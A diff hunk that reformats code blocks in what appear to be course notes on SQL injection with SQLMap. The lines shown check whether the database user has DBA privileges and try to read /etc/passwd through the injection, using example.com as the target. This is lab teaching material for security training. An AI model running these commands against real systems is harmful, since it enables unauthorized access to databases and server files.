@@ -1877,13 +1877,17 @@ current user is DBA: False
 
 As we can see, if we test that on one of the previous exercises, we get `current user is DBA: False`, meaning that we do not have DBA access. If we tried to read a file using SQLMap, we would get something like:
 
-        shellsession
-`[17:31:43] [INFO] fetching file: '/etc/passwd' [17:31:43] [ERROR] no data retrieved`
+```shell
+[17:31:43] [INFO] fetching file: '/etc/passwd'
+[17:31:43] [ERROR] no data retrieved
+```
 
 To test OS exploitation, let's try an exercise in which we do have DBA privileges, as seen in the questions at the end of this section:
 
-        shellsession
+```
+shell
 `adampueman@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --is-dba         ___       __H__ ___ ___["]_____ ___ ___  {1.4.11#stable} |_ -| . [']     | .'| . | |___|_  ["]_|_|_|__,|  _|       |_|V...       |_|   http://sqlmap.org [*] starting @ 17:37:47 /2020-11-19/ [17:37:47] [INFO] resuming back-end DBMS 'mysql' [17:37:47] [INFO] testing connection to the target URL sqlmap resumed the following injection point(s) from stored session: ...SNIP... current user is DBA: True [*] ending @ 17:37:48 /2020-11-19/`
+```
 
 We see that this time we get `current user is DBA: True`, meaning that we may have the privilege to read local files.
 <div align="center">
